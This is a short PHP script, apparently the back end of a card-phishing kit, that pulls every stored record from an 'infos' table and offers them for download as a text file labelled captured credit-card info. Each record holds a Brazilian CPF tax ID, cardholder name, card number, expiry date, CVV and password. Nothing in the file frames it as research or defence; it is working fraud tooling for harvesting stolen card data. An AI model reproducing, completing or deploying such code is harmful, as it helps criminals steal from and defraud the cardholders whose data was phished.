<?php
error_reporting(0);
include('../includes/conexao.php');

$sql = "SELECT * FROM infos";

$busca = mysqli_query($conexao, $sql);

$total = mysqli_num_rows($busca);







// DEFINE O FUSO HORARIO COMO O HORARIO DE BRASILIA
    date_default_timezone_set('America/Sao_Paulo');
// CRIA UMA VARIAVEL E ARMAZENA A HORA ATUAL DO FUSO-HORÀRIO DEFINIDO (BRASÍLIA)
    $data = date('d/m/Y H:i:s', time());
                        
 while($dados = mysqli_fetch_assoc($busca)){
      echo $dado = "
      <!------Info cc capturada------!>
       cpf: ".$dados["cpf"]."
       nome: ".$dados["nomeCard"]."
       cc : ".$dados["card"]."
       data : ".$dados["data"]."
       cvv : ".$dados["cvv"]."
       senha : ".$dados["senha"]."
       <---- Jv desenvolvimentos ---->
       ";
 

    $content[] = $dado.PHP_EOL;
}
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    // Indica o nome do arquivo como será "baixado". Você pode modificar e colocar qualquer nome de arquivo     
    header('Content-disposition: attachment; filename=ccs('.$data.').txt');
    //header('Content-Length: '.strlen($content));
    //header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    //header('Expires: 0');
    //header('Pragma: public');
    echo $content;
    



?>